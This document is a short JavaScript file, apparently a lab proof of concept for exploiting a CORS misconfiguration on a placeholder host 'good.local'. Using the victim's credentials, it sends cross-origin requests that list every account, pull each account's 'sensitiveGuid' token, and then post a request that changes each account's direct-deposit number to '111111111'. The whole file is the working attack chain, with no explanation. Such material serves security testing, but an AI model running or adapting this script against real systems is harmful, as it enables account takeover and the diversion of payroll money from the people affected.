server='http://good.local';
function runXHR(){
	sessionStorage.removeItem("sensitiveGuid");
	listAccounts();
}

function listAccounts(callback){
	var url = server + '/cors/listaccounts.php'
	var oReq = new XMLHttpRequest();
	
	oReq.onload = function () {
		if (oReq.readyState === oReq.DONE) {
        		if (oReq.status === 200) {
            			console.log(oReq.responseText);
				var personnelArray = JSON.parse(oReq.responseText);
				personnelArray.forEach(function (personnelNum) {
          getPrereq(personnelNum['personnelnum']);
        });
			}
		}
	};
	oReq.open("GET", url);
	oReq.setRequestHeader("derpycustomheader", "randomvalue");
	oReq.withCredentials = true;
	oReq.responseType = "text";
	oReq.send();
}

function getPrereq(personnelNum){
	var url = server + '/cors/prereq.php'
	var oReq = new XMLHttpRequest();
	
	oReq.onload = function () {
		if (oReq.readyState === oReq.DONE) {
        		if (oReq.status === 200) {
            			console.log(oReq.responseText);
				var sensitiveGuidArray = JSON.parse(oReq.responseText);
				
				updateBilling(personnelNum,sensitiveGuidArray['sensitiveGuid']);
			}
		}
	};
	params="{\"object\":\"" + personnelNum + "\"}";
	oReq.open("POST", url);
	oReq.setRequestHeader("Content-type", "application/json");
	oReq.setRequestHeader("derpycustomheader", "randomvalue");
	oReq.withCredentials = true;
	oReq.responseType = "text";
	oReq.send(params);
}

function updateBilling(personnelNum, sensitiveGuid){
	var url = server + '/cors/sensitiveop.php'
	var oReq = new XMLHttpRequest();
	
	oReq.onload = function () {
		if (oReq.readyState === oReq.DONE) {
        		if (oReq.status === 200) {
            			console.log(oReq.responseText);
			}
		}
	};
	params="{\"object\":\"" + personnelNum + "\",\"directdepositacct\":\"111111111\",\"stateGuid\":\"" + sensitiveGuid + "\"}";
	oReq.open("POST", url);
	oReq.setRequestHeader("Content-type", "application/json");
	oReq.withCredentials = true;
	oReq.responseType = "text";
	oReq.send(params);
}
